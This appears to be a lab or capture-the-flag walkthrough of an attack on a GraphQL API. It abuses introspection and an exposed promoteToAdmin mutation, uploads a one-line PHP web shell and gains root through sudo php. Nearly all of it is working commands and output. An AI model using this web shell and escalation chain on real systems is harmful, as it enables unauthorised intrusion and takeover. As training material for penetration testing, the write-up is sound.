GraphQL API with introspection enabled, exposing admin mutations.

### Initial Discovery
```
# Web app at http://10.10.10.100/graphql
# GraphQL endpoint

# Test introspection
curl -X POST http://10.10.10.100/graphql -d '{"query":"{__schema{types{name}}}"}'
# Returns all types
```

#### Enumerate Schema
```
# Get full schema
cat > query.graphql << 'EOF'
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}
EOF

curl -X POST http://10.10.10.100/graphql -d @query.graphql

# Found mutations:
# createUser(input: UserInput!): User
# updateUser(input: UserInput!): User
# deleteUser(id: ID!): Boolean
# promoteToAdmin(id: ID!): Boolean
```

#### Find Users
```
# Query users
cat > users.graphql << 'EOF'
{
  users {
    id
    username
    email
    role
  }
}
EOF

curl -X POST http://10.10.10.100/graphql -d @users.graphql
# {"data":{"users":[
#   {"id":"1","username":"admin","email":"admin@target.com","role":"user"},
#   {"id":"2","username":"john","email":"john@target.com","role":"user"},
#   {"id":"3","username":"jane","email":"jane@target.com","role":"user"}
# ]}}
```

#### Privilege Escalation
```
# Promote user to admin
cat > promote.graphql << 'EOF'
mutation {
  promoteToAdmin(id: "2")
}
EOF

curl -X POST http://10.10.10.100/graphql -d @promote.graphql
# {"data":{"promoteToAdmin":true}}

# Now user 2 (john) is admin
# Login as john (password found earlier)
```

#### Command Injection via Admin Panel
```
# Admin panel has file upload
# Upload reverse shell as admin

# PHP shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload via admin panel
# Access shell
curl "http://10.10.10.100/uploads/shell.php?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Root via Sudo
```
# Check sudo
sudo -l
# (ALL) NOPASSWD: /usr/bin/php

# Root via PHP
sudo php -r "system('/bin/bash');"
whoami
# root
```

